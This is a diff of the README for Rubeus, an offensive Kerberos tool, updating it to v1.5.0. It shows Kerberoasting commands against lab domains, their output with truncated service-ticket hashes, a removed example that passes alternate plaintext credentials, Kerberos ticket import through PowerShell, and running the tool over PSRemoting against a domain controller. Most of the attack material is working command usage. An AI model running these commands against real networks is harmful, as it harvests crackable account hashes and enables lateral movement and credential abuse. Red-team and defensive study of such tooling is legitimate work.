+    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+    [*] Target User            : harmj0y
+    [*] Searching the current domain for Kerberoastable users
+
+    [*] Total kerberoastable users : 1
+
+    $krb5tgs$18$*harmj0y$theshire.local$testspn/server*$F63783C58AA153F24DFCC796A120C55C$06C6929374A2D3...(snip)...
+
+
+Kerberoasting all users in a foreign _trusting_ domain, not line-wrapping the results:
+
+    C:\Rubeus>Rubeus.exe kerberoast /domain:dev.testlab.local /nowrap
 
      ______        _
     (_____ \      | |
@@ -1819,7 +1922,7 @@ Kerberoasting all users in a foreign _trusting_ domain:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.4
+    v1.5.0
 
 
     [*] Action: Kerberoasting
@@ -1830,32 +1933,6 @@ Kerberoasting all users in a foreign _trusting_ domain:
     [*] DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
     [*] ServicePrincipalName   : test/test
     [*] Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test@dev.testlab.local*$969339A82...(snip)...
-
-
-Kerberoasting users in a foreign non-trusting domain using alternate credentials:
-
-    C:\Rubeus>Rubeus.exe kerberoast /domain:external.local /creduser:"EXTERNAL.local\administrator" /credpassword:"Password123!"
-
-     ______        _
-    (_____ \      | |
-     _____) )_   _| |__  _____ _   _  ___
-    |  __  /| | | |  _ \| ___ | | | |/___)
-    | |  \ \| |_| | |_) ) ____| |_| |___ |
-    |_|   |_|____/|____/|_____)____/(___/
-
-    v1.3.4
-
-
-    [*] Action: Kerberoasting
-
-    [*] Target Domain          : external.local
-    [*] Using alternate creds  : EXTERNAL.local\administrator
-
-    [*] SamAccountName         : admanagement
-    [*] DistinguishedName      : CN=admanagement,CN=Users,DC=external,DC=local
-    [*] ServicePrincipalName   : RestrictedKrbHost/server.external.local
-    [*] Hash                   : $krb5tgs$23$*$external.local$RestrictedKrbHost/server.external.local@external.lo
-                                cal*$28F02F1AF08F9335C...(snip)...
 
 
 Kerberoasting using an existing TGT:
@@ -1878,6 +1955,7 @@ Kerberoasting using an existing TGT:
 
     [*] Target SPN             : asdf/asdfasdf
     [*] Hash                   : $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$4EFF99FDED690AB4616EB...(snip)...
+
 
 "Opsec" Kerberoasting, using the **tgtdeleg** trick, filtering out AES-enabled accounts:
 
@@ -2113,6 +2191,7 @@ Breakdown of the miscellaneous commands:
 | [changepw](#changepw) | Perform the Aorato Kerberos password reset |
 | [hash](#hash) | Hash a plaintext password to Kerberos encryption keys |
 | [tgssub](#tgssub) | Substitute in alternate service names into a service ticket |
+| [currentluid](#currentluid) | Display the current user's LUID |
 
 
 ### createnetonly
@@ -2525,6 +2604,27 @@ Executing S4U2self to a machine using its machine account hash, substituting in 
                 9 Dir(s)  40,462,831,616 bytes free
 
 
+### currentluid
+
+The **currentluid** action will display the current user's logon ID (LUID).
+
+    C:\Rubeus>Rubeus.exe currentluid
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.5.0
+
+
+    [*] Action: Display current LUID
+
+    [*] Current LogonID (LUID) : 0x121078 (1183864)
+
+
 ## Compile Instructions
 
 We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)
@@ -2562,11 +2662,27 @@ Rubeus can then be loaded in a PowerShell script with the following (where "aa..
 
 The Main() method and any arguments can then be invoked as follows:
 
-    [Rubeus.Program]::Main("dump /luid:3050142".Split())
+    [Rubeus.Program]::Main("dump /user:administrator".Split())
 
 Or individual functions can be invoked:
 
-    $KerbTicket = 'do...' # base64-encoded ticket.kirbi
-    $TicketBytes = [convert]::FromBase64String($KerbTicket)
-    $LogonID = [Rubeus.LSA]::CreateProcessNetOnly("mmc.exe", $false)
+    $TicketBytes = [convert]::FromBase64String('BASE64_KERB_TICKET')
+    # start mmc.exe as netonly, not-hidden
+    $LogonID = [Rubeus.Helpers]::CreateProcessNetOnly("mmc.exe", $true)
+    # apply the ticket to mmc's logon session
     [Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)
+
+#### Sidenote Sidenote: Running Rubeus Over PSRemoting
+
+Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Rubeus has a function to help with that.
+
+If you follow the instructions in [Sidenote: Running Rubeus Through PowerShell](#sidenote-running-rubeus-through-powershell) to create a Rubeus.ps1, append something like the following to the script:
+
+    [Rubeus.Program]::MainString("triage")
+
+You should then be able to run Rubeus over PSRemoting with something like the following:
+
+    $s = New-PSSession dc.theshire.local
+    Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1
+
+Alternatively, Rubeus' `/consoleoutfile:C:\FILE.txt` argument will redirect all output streams to the specified file.
